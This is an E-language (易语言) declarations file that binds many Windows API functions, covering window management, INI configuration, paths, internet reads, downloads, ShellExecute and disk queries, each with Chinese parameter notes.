.DLL命令 lstrcpyn_字节集, 整数型, "kernel32.dll", "lstrcpyn", 公开, 
    .参数 欲取其指针, 字节集, 传址, 
    .参数 欲取其指针, 字节集, 传址, 
    .参数 保留, 整数型, , 0

.DLL命令 lstrcpyn_整数型, 整数型, "kernel32.dll", "lstrcpyn", 公开, 
    .参数 欲取其指针, 整数型, 传址, 
    .参数 欲取其指针, 整数型, 传址, 
    .参数 保留, 整数型, , 0

.DLL命令 lstrcpyn_文本型, 整数型, "kernel32.dll", "lstrcpyn", 公开, 
    .参数 欲取其指针, 文本型, 传址, 
    .参数 欲取其指针, 文本型, 传址, 
    .参数 保留, 整数型, , 0

.DLL命令 lstrcpyn_字节型, 整数型, "kernel32.dll", "lstrcpyn", 公开, 
    .参数 欲取其指针, 字节型, 传址, 
    .参数 欲取其指针, 字节型, 传址, 
    .参数 保留, 整数型, , 0

.DLL命令 lstrcpyn_双精型, 整数型, "kernel32.dll", "lstrcpyn", 公开, 
    .参数 欲取其指针, 双精度小数型, 传址, 
    .参数 欲取其指针, 双精度小数型, 传址, 
    .参数 保留, 整数型, , 0

.DLL命令 lstrcpyn_子程序子针, 整数型, "kernel32.dll", "lstrcpyn", 公开, 
    .参数 欲取其指针, 子程序指针, 传址, 
    .参数 欲取其指针, 子程序指针, 传址, 
    .参数 保留, 整数型, , 0

.DLL命令 lstrcpyn_长整数型, 整数型, "kernel32.dll", "lstrcpyn", 公开, 
    .参数 欲取其指针, 长整数型, 传址, 
    .参数 欲取其指针, 长整数型, 传址, 
    .参数 保留, 整数型, , 0

.DLL命令 lstrlenA, 整数型, "kernel32.dll", "lstrlenA", 公开, 
    .参数 文本, 文本型, , Ptr

.DLL命令 GetModuleHandleA, 整数型, "kernel32.dll", "GetModuleHandleA", 公开, GetModuleHandleA获取一个应用程序或动态链接库的模块句柄  如执行成功成功，则返回模块句柄。零表示失败。会设置GetLastError
    .参数 模块名, 文本型, , 指定模块名，这通常是与模块的文件名相同的一个名字。例如，NOTEPAD.EXE程序的模块文件名就叫作NOTEPAD; user32.dll

.DLL命令 GetProcAddress, 整数型, "kernel32.dll", "GetProcAddress", 公开, ,GetProcAddress 如果GetProcAddress执行成功，则返回模块中函数入口处的地址，否则返回nil。
    .参数 模块句柄, 整数型, , hModule
    .参数 进程名称, 文本型, , lpProcName

.DLL命令 CallWindowProcA_shellcode, 整数型, "user32", "CallWindowProcA", , 将消息传答窗口函数
    .参数 lpPrevWndFunc, 字节集, 传址, 
    .参数 hwnd, 整数型, , 
    .参数 msg, 整数型, , 
    .参数 wParam, 整数型, , 
    .参数 lParam, 整数型, , 

.DLL命令 CallWindowProcA, 整数型, "", "CallWindowProcA", 公开, 
    .参数 动态调用代码, 字节集, , 一定要用本人编写的
    .参数 子程序, 整数型, , 子程序指针
    .参数 参数, 整数型, 数组, 为整数数组，参数1为成员1…类推；文本型和字节集型（自定义结构）为指针
    .参数 参数数目, 整数型, , 一定要和参数数组相符，不然会出错
    .参数 是否C调用, 逻辑型, , 真为cdecl调用方式，假为stdcall调用方式（即标准WINAPI方式）

.DLL命令 CallWindowProcB, 整数型, "user32.dll", "CallWindowProcA", 公开, CallWindowProcA
    .参数 前一窗口函数地址, 整数型, , 
    .参数 窗口句柄, 整数型, , 
    .参数 消息值, 整数型, , 
    .参数 附加参数1, 整数型, , 
    .参数 附加参数2, 整数型, , 

.DLL命令 StrTrimA, 整数型, "shlwapi.dll", "StrTrimA", 公开,  StrTrimA替换首尾文本 例子:文本:12341 替换首尾文本:1  结果: 文本:=234
    .参数 文本, 文本型, , psz    例子:文本:12341 替换首尾文本:1  结果: 文本:=234
    .参数 文本, 文本型, , pszTrimChars 例子:文本:12341 替换首尾文本:1  结果: 文本:=234

.DLL命令 LocalFree, 整数型, "", "", 公开, 
    .参数 hMem, 整数型, , 

.DLL命令 StrToInt64ExA, 整数型, "shlwapi.dll", "StrToInt64ExA", 公开, 十六进制转十进制增强_StrToInt64ExA  成功返回1(非0) 失败返回0 可以判断是不是输入的不是 O到9  A到F
    .参数 转换文本, 文本型, , pszString  一般为 如果标志为0的话 则直接填写 转换文本 如果标志为1的话 转换文本="0x"+转换文本
    .参数 标志, 整数型, , dwFlags 标志为0则为10进制 标志为1则为十六进制
    .参数 返回值, 整数型, 传址, piRet

.DLL命令 GetFileTitleA, 空白型, "comdlg32.dll", "GetFileTitleA", , 返回文件名
    .参数 lpszFile, 文本型, , 
    .参数 lpszTitle, 文本型, , 
    .参数 cbBuf, 短整数型, , 

.DLL命令 GetCurrentDirectoryA, 整数型, "kernel32.dll", "GetCurrentDirectoryA", 公开, 
    .参数 缓冲区长度, 整数型, , 
    .参数 缓冲区, 文本型, , 

.DLL命令 PathFileExistsA, 逻辑型, "shlwapi.dll", "PathFileExistsA", , 检测文件是否存在，0不存在, 1存在
    .参数 pszPath, 文本型, , 文件名（含路径）

.DLL命令 GetShortPathNameA, 整数型, "kernel32.dll", "GetShortPathNameA", 公开, 获取指定文件的短路径名 Long，装载到lpszShortPath缓冲区的字符数量。如lpszShortPath的长度不足，不能容下文件名，就返回需要的缓冲区长度
    .参数 完整路径, 文本型, , lpszLongPath String，指定欲获取短路径名的那个文件的名字。可以是个完整路径，或者由当前目录决定
    .参数 缓冲区, 文本型, , lpszShortPath String，指定一个缓冲区，用于装载文件的短路径和文件名
    .参数 缓冲区长度, 整数型, , cchBuffer Long，lpszShortPath缓冲区长度

.DLL命令 PathIsDirectoryA, 整数型, "shlwapi.dll", "PathIsDirectoryA", 公开, ，0不存在, 16存在
    .参数 目录名, 文本型, , 目录名（含路径） pszPath

.DLL命令 WritePrivateProfileStringA_创建或修改配置文件, 整数型, "kernel32.dll", "WritePrivateProfileStringA", , 创建或修改配置文件,如果配置文件不存在则将被创建
    .参数 小节名, 文本型, , 就是用中括号括起来的内容
    .参数 项目名, 文本型, , 就是等号前边的内容
    .参数 项目值, 文本型, , 就是等号后面的内容
    .参数 文件名, 文本型, , 就是你要写入的那个文件

.DLL命令 GetPrivateProfileStringA_读配置文本, 整数型, "kernel32.dll", "GetPrivateProfileStringA", , 
    .参数 小节名, 文本型, , 就是用中括号括起来的内容
    .参数 项目名, 文本型, , 就是等号前边的内容
    .参数 默认值, 文本型, , 可以为“”
    .参数 缓冲容器, 文本型, , 一般将容器的大小设定为255
    .参数 缓冲容积, 整数型, , 应与缓冲容器的大小相等255
    .参数 文件名, 文本型, , 就是你要写入的那个文件

.DLL命令 WritePrivateProfileStringA_删配置文件项, 整数型, "kernel32.dll", "WritePrivateProfileStringA", , 
    .参数 小节名, 文本型, , 就是用中括号括起来的内容
    .参数 项目名, 文本型, , 就是等号前边的内容
    .参数 项目值, 整数型, , 0
    .参数 文件名, 文本型, , 就是你要写入的那个文件

.DLL命令 WritePrivateProfileStringA_删配置文件小节, 整数型, "kernel32.dll", "WritePrivateProfileStringA", , 
    .参数 小节名, 文本型, , 就是用中括号括起来的内容
    .参数 项目名, 整数型, , 0
    .参数 项目值, 整数型, , 0
    .参数 文件名, 文本型, , 就是你要写入的那个文件

.DLL命令 GetPrivateProfileSectionA_取指定小节所有项名和值的一个列表, 整数型, "kernel32.dll", "GetPrivateProfileSectionA", , 获取指定小节所有项名和值的一个列表  装载到lpReturnedString缓冲区的字符数量。如缓冲区的容量不够大，不能容下所有信息，就返回nSize-2
    .参数 lpAppName, 文本型, , 欲获取的小节。注意这个字串不区分大小写
    .参数 lpReturnedString, 字节集, , 项和值字串的列表。每个字串都由一个NULL字符分隔，最后一个字串后面用两个NULL字符中止
    .参数 nSize, 整数型, , lpReturned缓冲区的大小。在windows系统中最大值为32767
    .参数 lpFileName, 文本型, , 初始化文件的名字。如没有指定完整路径名，windows就在Windows目录中查找文件;

.DLL命令 GetPrivateProfileSectionNamesA_字节集, 整数型, "kernel32.dll", "GetPrivateProfileSectionNamesA", , 
    .参数 lpszReturnBuffer, 字节集, , 
    .参数 nSize, 整数型, , 
    .参数 lpFileName, 文本型, , 

.DLL命令 GetCommandLineA, 文本型, "kernel32.dll", "GetCommandLineA", 公开, Win32程序的命令行参数  命令行参数的方法是使用 Api - GetCommandLine，它没有输入参数，返回的是指向命令行的指针，返回的字符串中，包含执行文件的文件名

.DLL命令 SetEnvironmentVariableA, 整数型, "kernel32.dll", "SetEnvironmentVariableA", 公开, 置环境变量值 TRUE（非零）表示成功，否则返回零
    .参数 环境字串名称, 文本型, , 
    .参数 价值, 文本型, , 

.DLL命令 GetModuleFileNameA, 整数型, "kernel32.dll", "GetModuleFileNameA", 公开, GetModuleFileNameA $(b)获取一个已装载模板的完整路径名称  如执行成功，返回复制到lpFileName的实际字符数量；零表示失败。会设置GetLastError
    .参数 模块句柄, 整数型, , 一个模块的句柄。可以是一个DLL模块，或者是一个应用程序的实例句柄一般填写0
    .参数 文件名缓冲区, 文本型, , 指定一个字串缓冲区，要在其中容纳文件的用NULL字符中止的路径名，hModule模块就是从这个文件装载进来的
    .参数 缓冲区大小, 整数型, , 装载到缓冲区lpFileName的最大字符数量;

.DLL命令 ExpandEnvironmentStringsA, 整数型, "", "", , 
    .参数 a, 文本型, , 
    .参数 b, 文本型, , 
    .参数 c, 整数型, , 

.DLL命令 IsWindow, 整数型, "user32.dll", "IsWindow", , 判断一个窗口句柄是否有效(非零表示成功，零表示失败)
    .参数 窗口句柄, 整数型, , 待检查窗口的句柄

.DLL命令 IsZoomed, 整数型, "user32.dll", "IsZoomed", 公开, IsZoomed 判断窗口是否最大化  返回1为窗口最大化真  0为窗口最大化为假
    .参数 窗口句柄, 整数型, , hwnd,欲测试的窗口的句柄

.DLL命令 SetFocus, 整数型, "user32.dll", "SetFocus", 公开, SetFocus 函数功能：该函数对指定的窗口设置键盘焦点。返回当前窗口焦点
    .参数 窗口句柄, 整数型, , hWnd

.DLL命令 IsWindowVisible, 整数型, "user32.dll", "IsWindowVisible", 公开, , 判断窗口是否可见   0 为隐藏 1为显示
    .参数 窗口句柄, 整数型, , hwnd,要测试的那个窗口的句柄

.DLL命令 FindWindowExA, 整数型, "user32.dll", "FindWindowExA", 公开, , 在窗口列表中寻找与指定条件相符的第一个子窗口  找到的窗口的句柄。如未找到相符窗口，则返回零。会设置GetLastError
    .参数 窗口句柄1, 整数型, , 在其中查找子的父窗口。如设为零，表示使用桌面窗口（通常说的顶级窗口都被认为是桌面的子窗口，所以也会对它们进行查找）
    .参数 窗口句柄2, 整数型, , 一般可以设置为0     从这个窗口后开始查找。这样便可利用对FindWindowEx的多次调用找到符合条件的所有子窗口。如设为零，表示从第一个子窗口开始搜索
    .参数 欲搜索的类名1, 文本型, , 欲搜索的类名。 零表示忽略 易语言代码: 字符(0)
    .参数 欲搜索的类名2, 文本型, , 指向一个指定了窗口名（窗口标题）的空结束字符串 "按钮"

.DLL命令 FindWindowA, 整数型, "user32.dll", "FindWindowA", , 寻找窗口列表中第一个符合指定条件的顶级窗口（在vb里使用：FindWindow最常见的一个用途是获得ThunderRTMain类的隐藏窗口的句柄；该类是所有运行中vb执行程序的一部分。获得句柄后，可用api函数Get WindowText取得这个窗口的名称；该名也是应用程序的标题）　找到窗口的句柄。如未找到相符窗口，则返回零。会设置GetLastError
    .参数 窗口类名, 文本型, , 指向包含了窗口类名的空中止（C语言）字串的指针；或设为零，表示接收任何类
    .参数 窗口文本, 文本型, , 指向包含了窗口文本（或标签）的空中止（C语言）字串的指针；或设为零，表示接收任何窗口标题  示例Dim hw&, cnt&Dim rttitle As  * 256hw& = FindWindow("ThunderRT5Main", vbNullString) ' ThunderRTMain under VB4cnt = Get WindowText(hw&, rttitle, 255)MsgBox Left, 0, "RTMain title";

.DLL命令 FindWindowA_标题, 整数型, "user32.dll", "FindWindowA", , 寻找窗口列表中第一个符合指定条件的顶级窗口（在vb里使用：FindWindow最常见的一个用途是获得ThunderRTMain类的隐藏窗口的句柄；该类是所有运行中vb执行程序的一部分。获得句柄后，可用api函数Get WindowText取得这个窗口的名称；该名也是应用程序的标题）　找到窗口的句柄。如未找到相符窗口，则返回零。会设置GetLastError
    .参数 窗口类名, 整数型, , 指向包含了窗口类名的空中止（C语言）字串的指针；或设为零，表示接收任何类
    .参数 窗口文本, 文本型, , 指向包含了窗口文本（或标签）的空中止（C语言）字串的指针；或设为零，表示接收任何窗口标题  示例Dim hw&, cnt&Dim rttitle As  * 256hw& = FindWindow("ThunderRT5Main", vbNullString) ' ThunderRTMain under VB4cnt = Get WindowText(hw&, rttitle, 255)MsgBox Left, 0, "RTMain title";

.DLL命令 FindWindowA_类名, 整数型, "user32.dll", "FindWindowA", , 寻找窗口列表中第一个符合指定条件的顶级窗口（在vb里使用：FindWindow最常见的一个用途是获得ThunderRTMain类的隐藏窗口的句柄；该类是所有运行中vb执行程序的一部分。获得句柄后，可用api函数Get WindowText取得这个窗口的名称；该名也是应用程序的标题）　找到窗口的句柄。如未找到相符窗口，则返回零。会设置GetLastError
    .参数 窗口类名, 文本型, , 指向包含了窗口类名的空中止（C语言）字串的指针；或设为零，表示接收任何类
    .参数 窗口文本, 整数型, , 指向包含了窗口文本（或标签）的空中止（C语言）字串的指针；或设为零，表示接收任何窗口标题  示例Dim hw&, cnt&Dim rttitle As  * 256hw& = FindWindow("ThunderRT5Main", vbNullString) ' ThunderRTMain under VB4cnt = Get WindowText(hw&, rttitle, 255)MsgBox Left, 0, "RTMain title";

.DLL命令 GetClassNameA, 整数型, "user32.dll", "GetClassNameA", 公开, 
    .参数 窗口句柄, 整数型, , 
    .参数 缓冲区, 文本型, 传址, 
    .参数 缓冲区长度, 整数型, , 

.DLL命令 BringWindowToTop, 整数型, "user32.dll", "BringWindowToTop", 公开, 
    .参数 窗口句柄, 整数型, , hwnd,欲带至顶部的那个窗口的句柄

.DLL命令 SetWindowTextA, 整数型, "user32.dll", "SetWindowTextA", 公开, 
    .参数 窗口句柄, 整数型, , 
    .参数 窗口标题, 文本型, , 

.DLL命令 GetWindowTextA, 整数型, "user32.dll", "GetWindowTextA", , 取得一个窗体的标题（caption）文字，或者一个控件的内容（在vb里使用：使用vb窗体或控件的caption或text属性）　复制到lpString的字串长度；不包括空中止字符。会设置GetLastError
    .参数 句柄, 整数型, , 欲获取文字的那个窗口的句柄
    .参数 文本, 文本型, , 预定义的一个缓冲区，至少有cch+1个字符大小；随同窗口文字载入
    .参数 文本长度, 整数型, , lp缓冲区的长度;  

.DLL命令 GetWindowTextLengthA, 整数型, "user32.dll", "GetWindowTextLengthA", 公开, 
    .参数 窗口句柄, 整数型, , 

.DLL命令 LockWindowUpdate, 整数型, "user32.dll", "LockWindowUpdate", 公开, LockWindowUpdate 锁定指定窗口，禁止它更新。同时只能有一个窗口处于锁定状态
    .参数 窗口句柄, 整数型, , hwndLock,欲锁定窗口的句柄。如设为零，则对窗口解锁

.DLL命令 ShowWindow, 整数型, "user32.dll", "ShowWindow", 公开, 控制窗口的可见性（在vb里使用：针对vb窗体及控件，请使用对应的vb属性）  如窗口之前是可见的，则返回TRUE（非零），否则返回FALSE（零）
    .参数 窗口句柄, 整数型, , 窗口句柄，要向这个窗口应用由nCmdShow指定的命令
    .参数 窗口状态, 整数型, , 为窗口指定可视性方面的一个命令。请用下述任何一个常数;0隐藏窗口，活动状态给令一个窗口;1与9相同;2最小化窗口，并将其激活;3最大化窗口，并将其激活;4用最近的大小和位置显示一个窗口，同时不改变活动窗口;5用当前的大小和位置显示一个窗口，同时令其进入活动状态;6最小化窗口，活动状态给令一个窗口;7最小化一个窗口，同时不改变活动窗口;8用当前的大小和位置显示一个窗口，不改变活动窗口;9用原来的大小和位置显示一个窗口，同时令其进入活动状态;

.DLL命令 MoveWindow, 整数型, "user32.dll", "MoveWindow", 公开, MoveWindow
    .参数 窗口句柄, 整数型, , hwnd，欲移动窗口的句柄
    .参数 左侧位置, 整数型, , x，窗口新的左侧位置
    .参数 顶部位置, 整数型, , y，窗口新的顶部位置
    .参数 新宽度, 整数型, , nWidth，窗口的新宽度
    .参数 新高度, 整数型, , nHeight，窗口的高宽度
    .参数 是否重画, 整数型, , bRepaint，如窗口此时应重画，则设为TRUE（非零）

.DLL命令 SetWindowPos, 整数型, "user32.dll", "SetWindowPos", , Long，非零表示成功，零表示失败。会设置GetLastError
    .参数 窗口句柄, 整数型, , Long，欲定位的窗口
    .参数 定位类型, 整数型, , Long，窗口句柄。 取－1表示在最顶层显示窗口，取1表示在最底层显示；  在窗口列表中，窗口hwnd会置于这个窗口句柄的后面。HWND_BOTTOM将窗口置于窗口列表底部HWND_TOP将窗口置于Z序列的顶部；Z序列代表在分级结构中，窗口针对一个给定级别的窗口显示的顺序HWND_TOPMOST将窗口置于列表顶部，并位于任何最顶部窗口的前面HWND_NOTOPMOST将窗口置于列表顶部，并位于任何最顶部窗口的后面
    .参数 窗口新横坐标, 整数型, , Long，窗口新的x坐标。如hwnd是一个子窗口，则x用父窗口的客户区坐标表示
    .参数 窗口新纵坐标, 整数型, , Long，窗口新的y坐标。如hwnd是一个子窗口，则y用父窗口的客户区坐标表示
    .参数 窗口新宽度, 整数型, , Long，指定新的窗口宽度
    .参数 窗口新高度, 整数型, , Long，指定新的窗口高度
    .参数 显示方式, 整数型, , Long参数若取1，表示窗口大小保持不变，取2表示保持位置不变，因此，取3（=1＋2）表示大小和位置均保持不变，取0表示将窗口的大小和位置改变为指定值。 ，包含了旗标的一个整数SWP_DRAWFRAME围绕窗口画一个框SWP_HIDEWINDOW隐藏窗口等等

.DLL命令 GetFocus, 整数型, "user32.dll", "GetFocus", 公开, GetFocus，获得拥有输入焦点的窗口的句柄

.DLL命令 SetParent, 整数型, "user32.dll", "SetParent", 公开, SetParent返回值：如果函数成功，返回值为子窗口的原父窗口句柄；如果函数失败，返回值为NULL。若想获得多错误信息，请调用GetLastError函数。
    .参数 子窗口句柄, 整数型, , hWndChild
    .参数 新的父窗口句柄, 整数型, , hWndNewParent

.DLL命令 SetForegroundWindow, 整数型, "user32.dll", "SetForegroundWindow", 公开, SetForegroundWindow Long，非零表示成功，零表示失败。会设置GetLastError
    .参数 窗口句柄, 整数型, , hwnd Long，带到前台的窗口

.DLL命令 IsIconic, 整数型, "user32.dll", "IsIconic", 公开, IsIconic, 判断窗口是否已最小化 Long，非零表示成功，零表示失败
    .参数 窗口句柄, 整数型, , hwnd,待检测窗口的句柄

.DLL命令 EnableWindow, 整数型, "user32.dll", "EnableWindow", 公开, EnableWindow Long，非零表示成功，零表示失败。会设置GetLastError, 在指定的窗口里允许或禁止所有鼠标及键盘输入
    .参数 窗口句柄, 整数型, , hwnd，窗口句柄
    .参数 标识符, 整数型, , fEnable，非零允许，零禁止

.DLL命令 GetWindowLongA, 整数型, "user32.dll", "GetWindowLongA", 公开, GetWindowLongA从指定窗口的结构中取得信息  由nIndex决定。零表示出错。会设置GetLastError
    .参数 窗口句柄, 整数型, , 欲为其获取信息的窗口的句柄
    .参数 属性, 整数型, , 欲取回的信息，可以是下述任何一个常数：;GWL_EXSTYLE：扩展窗口样式;GWL_STYLE：窗口样式;GWL_WNDPROC：该窗口的窗口函数的地址;GWL_HINSTANCE：拥有窗口的实例的句柄;GWL_HWNDPARENT：该窗口之父的句柄。不要用SetWindowWord来改变这个值;GWL_ID：对话框中一个子窗口的标识符;GWL_USERDATA：含义由应用程序规定;DWL_DLGPROC：这个窗口的对话框函数地址;DWL_MSGRESULT：在对话框函数中处理的一条消息返回的值;DWL_USER：含义由应用程序规定;

.DLL命令 SetWindowLongA, 整数型, "user32.dll", "SetWindowLongA", 公开, SetWindowLongA在窗口结构中为指定的窗口设置信息  指定数据的前一个值
    .参数 窗口句柄, 整数型, , hwnd，欲为其取得信息的窗口的句柄
    .参数 窗口信息值, 整数型, , nIndex，请参考GetWindowLong函数的nIndex参数的说明
    .参数 窗口信息新值, 整数型, , dwNewLong，由nIndex指定的窗口信息的新值

.DLL命令 SetLayeredWindowAttributes, 整数型, "user32.dll", "SetLayeredWindowAttributes", 公开, SetLayeredWindowAttributes 设置窗口透明度
    .参数 窗口句柄, 整数型, , 要设置透明度的窗口句柄。hwnd是透明窗体的句柄，
    .参数 颜色值, 整数型, , crKey为颜色值，// 掩码的颜色，可以用RGB(r,g,b)来指定
    .参数 透明度, 整数型, , 为0-255之间的整数。0 - 整个窗口透明, 255 - 完全不透明。bAlpha是透明度，取值范围是[0,255]，
    .参数 透明方式, 整数型, , dwFlags是透明方式，可以取两个值   LWA_ALPHA = 2 LWA_COLORKEY=1 当取值为LWA_ALPHA时，crKey参数无效，bAlpha参数有效； 当取值为LWA_COLORKEY时，窗体中的所有颜色为crKey的地方将变为透明，bAlpha参数无效   也可以取两个值的组合：LWA_ALPHA Or LWA_COLORKEY。这样crKey的地方将变为全透明，而其它地方根据bAlpha参数确定透明度。

.DLL命令 GetOpenClipboardWindow, 整数型, "user32.dll", "GetOpenClipboardWindow", 公开, $(b)返回打开CLIPBOARD的窗口句柄

.DLL命令 EnumWindows, 整数型, "user32.dll", "EnumWindows", 公开, 枚举窗口列表中的所有父窗口（顶级和被所有窗口）
    .参数 函数指针, 子程序指针, , lpEnumFunc,指向为每个子窗口都调用的一个函数的指针
    .参数 自定义数值, 整数型, , lParam,参见相关帮助

.DLL命令 SetDlgItemTextA, 整数型, "user32.dll", "SetDlgItemTextA", 公开, 该函数设置对话框中控制的文本和标题。
    .参数 对话框的句柄, 整数型, , hDlg
    .参数 指定控件的标识符, 整数型, , nIDDlgItem 指定控件的标识符（ID）。
    .参数 设置文本, 文本型, , lpString  

.DLL命令 GetDlgItemA, 整数型, "user32.dll", "GetDlgItemA", 公开, 返回值为给定控制的窗口句柄。如果函数调用失败，则返回值为NULL
    .参数 对话框的句柄, 整数型, , hDlg
    .参数 指定控件的标识符, 整数型, , nIDDlgItem 指定控件的标识符（ID）。

.DLL命令 GetDlgItemTextA, 整数型, "user32.dll", "GetDlgItemTextA", 公开, 该函数用于获取对话框中指定控件的标题或文本。  如果函数调用成功，返回值为拷贝到缓冲区中的 TCHAR 字符个数（不包括结束空字符）。如果函数调用失败，返回值为 0  
    .参数 对话框的句柄, 整数型, , hDlg
    .参数 指定控件的标识符, 整数型, , nIDDlgItem 指定控件的标识符（ID）。
    .参数 缓冲区, 文本型, , lpString  指向用于接收获取结果的缓冲区的指针
    .参数 缓冲区最大字符数, 整数型, , nMaxCount

.DLL命令 EmptyClipboard, 整数型, "user32.dll", "EmptyClipboard", 公开,  清除当前 Windows 系统剪辑板中的所有数据

.DLL命令 DestroyWindow, 整数型, "user32.dll", "DestroyWindow", 公开, 
    .参数 窗口句柄, 整数型, , hwnd,预清除的窗口的句柄

.DLL命令 OpenIcon, 整数型, "user32.dll", "OpenIcon", 公开, 恢复被最小化或最大化的窗口
    .参数 窗口句柄, 整数型, , hwnd，窗口句柄

.DLL命令 GetSystemMetrics, 整数型, "user32", "GetSystemMetrics", 公开, ,GetSystemMetrics
    .参数 索引, 整数型, , 

.DLL命令 GetDesktopWindow, 整数型, "user32.dll", "GetDesktopWindow", 公开, 返回屏幕句柄

.DLL命令 GetTickCount, 整数型, "kernel32.dll", "GetTickCount", 公开, GetTickCount 返回值 以毫秒为单位的windows运行时间 用于获取自windows启动以来经历的时间长度（毫秒）

.DLL命令 SetTimer, 整数型, "user32.dll", "SetTimer", 公开, 
    .参数 窗口句柄, 整数型, , hwnd
    .参数 事件标识符, 整数型, , nIDEvent
    .参数 时钟周期, 整数型, , uElapse
    .参数 子程序指针, 整数型, , lpTimerFunc

.DLL命令 KillTimer, 整数型, "user32.dll", "KillTimer", 公开, 
    .参数 窗口句柄, 整数型, , hwnd
    .参数 事件标识符, 整数型, , nIDEvent

.DLL命令 URLDownloadToFileA, 整数型, "urlmon.dll", "URLDownloadToFileA", , URLDownloadToFile成功返回0 失败返回-2146697211
    .参数 参数1, 整数型, , pCaller  一般为0
    .参数 HTTP文件地址, 文本型, , szURL 本参数指定欲读取文件在互联网上的HTTP地址（即URL）
    .参数 保存到本地文件名, 文本型, , szFileName 
    .参数 参数二, 整数型, , dwReserved 一般为0
    .参数 参数三, 整数型, , lpfnCB  一般为0

.DLL命令 InternetCheckConnectionA, 整数型, "wininet.dll", "InternetCheckConnectionA", 公开, InternetCheckConnectionA ' 连接网站，成功返回非0 
    .参数 Url地址, 文本型, , lpszUrl 
    .参数 标志, 整数型, , dwFlags  一般为1
    .参数 返回值, 整数型, , dwReserved 一般为0

.DLL命令 ShellExecuteA, 整数型, "", "ShellExecuteA", 公开, 执行命令
    .参数 窗口句柄, 整数型, , 父窗口句柄,可为0 hwnd   0  指定一个窗口的句柄，有时候，windows程序有必要在创建自己的主窗口前显示一个消息框
    .参数 操作方式, 文本型, , lpOperation“open”  指定字串“open”来打开lpFlie文档，或指定“Print”来打印它
    .参数 链接地址, 文本型, , lpFile要打开的网页地址  或 mailo:709760015@qq.com  想用关联程序打印或打开一个程序名或文件名
    .参数 命令行参数, 文本型, , lpParameters“”或"0" 如lpszFlie是可执行文件，则这个字串包含传递给执行程序的参数
    .参数 完整路径, 文本型, , lpDirectory“”或"0" 想使用的完整路径
    .参数 窗口显示方式, 短整数型, , nShowCmd 5或1 定义了如何显示启动程序的常数值。参考ShowWindow函数的nCmdShow参数;

.DLL命令 InternetReadFile, 整数型, "wininet.dll", "InternetReadFile", 公开, 
    .参数 Internet地址句柄, 整数型, , hFile
    .参数 数据缓冲区, 字节集, , sBuffer
    .参数 读取大小, 整数型, , lNumBytesToRead
    .参数 读取首地址, 整数型, 传址, lNumberOfBytesRead

.DLL命令 InternetOpenA, 整数型, "wininet.dll", "InternetOpenA", 公开, InternetOpen*  InetrnetOpen 初始化 WinInet.dll
    .参数 代理商名称, 文本型, , sAgent  
    .参数 存取类型, 整数型, , lAccessType  比如:1
    .参数 代理名称, 文本型, , sProxyName  比如:""
    .参数 代理地址, 文本型, , sProxyBypass 比如""
    .参数 标志, 整数型, , lFlags      比如:0

.DLL命令 InternetCloseHandle, 整数型, "wininet.dll", "InternetCloseHandle", 公开, *
    .参数 Internet句柄, 整数型, , hInet

.DLL命令 InternetOpenUrlA, 整数型, "wininet.dll", "InternetOpenUrlA", 公开, *
    .参数 Internet句柄, 整数型, , hInternetSession
    .参数 Url地址, 文本型, , lpszUrl
    .参数 头文本, 文本型, , lpszHeaders     例子:""
    .参数 头文本长度, 整数型, , dwHeadersLength  例子: 0
    .参数 标志, 整数型, , dwFlags       例子:-2147483648
    .参数 定义值, 整数型, , dwContext   例子:0

.DLL命令 HttpQueryInfoA, 整数型, "Wininet.dll", "HttpQueryInfoA", , 
    .参数 hRequest, 整数型, , 
    .参数 dwInfoLevel, 整数型, , 
    .参数 lpvBuffer, 整数型, 传址, 
    .参数 lpdwBufferLength, 整数型, 传址, 
    .参数 lpdwIndex, 整数型, 传址, 

.DLL命令 GetDiskFreeSpaceExA, 整数型, "kernel32.dll", "GetDiskFreeSpaceExA", , 
    .参数 lpDirectoryName, 文本型, , 
    .参数 lpFreeBytesAvailableToCaller, 长整数型, 传址, 
    .参数 lpTotalNumberOfBytes, 长整数型, 传址, 
    .参数 lpTotalNumberOfFreeBytes, 长整数型, 传址, 

.DLL命令 GetLogicalDriveStringsA, 整数型, "kernel32.dll", "GetLogicalDriveStringsA", , 
    .参数 nBufferLength, 整数型, , 
    .参数 lpBuffer, 字节集, , 

.DLL命令 SetVolumeLabelA, 逻辑型, "kernel32.dll", "SetVolumeLabelA", , 
    .参数 lpRootPathName, 文本型, , 
    .参数 lpVolumeName, 文本型, , 

.DLL命令 GetVolumeInformationA, 整数型, "kernel32.dll", "GetVolumeInformationA", , 
    .参数 lpRootPathName, 文本型, , 
    .参数 lpVolumeNameBuffer, 文本型, , 
    .参数 nVolumeNameSize, 整数型, , 
    .参数 lpVolumeSerialNumber, 整数型, 传址, 
    .参数 lpMaximumComponentLength, 整数型, 传址, 
    .参数 lpFileSystemFlags, 整数型, 传址, 
    .参数 lpFileSystemNameBuffer, 文本型, , 
    .参数 nFileSystemNameSize, 整数型, , 

.DLL命令 SetCurrentDirectoryA, 逻辑型, "kernel32.dll", "SetCurrentDirectoryA", , 
    .参数 lpPathName, 文本型, , 

.DLL命令 GetDriveTypeA, 整数型, "kernel32.dll", "GetDriveTypeA", , 
    .参数 nDrive, 文本型, , 

.DLL命令 CreateDirectoryA, 逻辑型, "kernel32.dll", "CreateDirectoryA", , 
    .参数 lpPathName, 文本型, , 
    .参数 lpSecurityAttributes, 整数型, , 

.DLL命令 SHGetFolderLocation, 整数型, "shell32.dll", "", , 
    .参数 hwndOwner, 整数型, , 
    .参数 nFolder, 整数型, , 
    .参数 hToken, 整数型, , 
    .参数 dwReserved, 整数型, , 
    .参数 pidl, ITEMIDLIST, 传址, 

.DLL命令 SHQueryRecycleBinA, 整数型, "shell32.dll", "SHQueryRecycleBinA", , 
    .参数 根路径, 文本型, , 
    .参数 回收站询问信息, SHQUERYRBINFO, 传址, 

.DLL命令 MultiByteToWideChar, 整数型, "", "MultiByteToWideChar", , 
    .参数 CodePage, 整数型, , 
    .参数 dwFlags, 整数型, , 
    .参数 lpMultiByteStr, 文本型, , 
    .参数 cchMultiByte, 整数型, , 
    .参数 lpWideCharStr, 字节集, , 
    .参数 cchWideChar, 整数型, , 

.DLL命令 PathIsDirectoryEmptyA, 逻辑型, "shlwapi.dll", "PathIsDirectoryEmptyA", , 
    .参数 pszPath, 文本型, , 

.DLL命令 ILCreateFromPathW, 整数型, "", "ILCreateFromPathW", , 
    .参数 pwszPath, 字节集, , 

.DLL命令 SHBrowseForFolderA, 整数型, "shell32.dll", "SHBrowseForFolderA", , 
    .参数 lpBrowseInfo, BROWSEINFO, 传址, 

.DLL命令 SHGetPathFromIDListA, 整数型, "shell32.dll", "SHGetPathFromIDListA", , 
    .参数 pidl, 整数型, , 
    .参数 pszPath, 文本型, , 

